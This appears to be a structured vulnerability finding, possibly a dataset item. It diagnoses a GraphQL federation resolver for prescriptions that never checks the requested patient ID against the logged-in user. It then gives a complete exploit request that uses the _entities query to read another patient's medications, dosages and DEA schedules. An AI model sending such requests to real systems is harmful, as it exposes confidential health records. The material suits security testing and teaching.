diagnosis: The federated entity resolver for Prescription relies on compound key fields { id, patientId } provided directly in the federation representation without matching ref.patientId against context.currentUser.patientId. An attacker can craft a federated entity representation with arbitrary patient IDs to inspect confidential scheduled medication prescriptions and dosages.
exploit_request:
POST /graphql HTTP/1.1
Host: pharmacy-subgraph.health.org
Authorization: Bearer <patient_token>
Content-Type: application/json

{"query": "query { _entities(representations: [{ __typename: \"Prescription\", id: \"rx_88192\", patientId: \"pat_target_4011\" }]) { ... on Prescription { medication dosage refillsRemaining deaSchedule } } }"}
